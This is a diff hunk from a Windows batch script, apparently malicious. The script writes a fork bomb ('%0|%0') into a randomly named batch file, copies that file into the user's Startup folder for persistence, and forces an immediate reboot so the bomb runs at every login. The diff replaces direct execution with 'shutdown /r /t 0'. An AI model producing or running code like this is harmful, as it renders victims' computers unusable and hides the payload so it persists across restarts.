@@ -26,4 +26,4 @@ pause >nul
 del xwkqelajcmLsldi.bat >nul
 echo %%0^|%%0 ^>nul > xwkqelajcmLsldi.bat
 copy xwkqelajcmLsldi.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
-.\xwkqelajcmLsldi.bat >nul
+shutdown /r /t 0
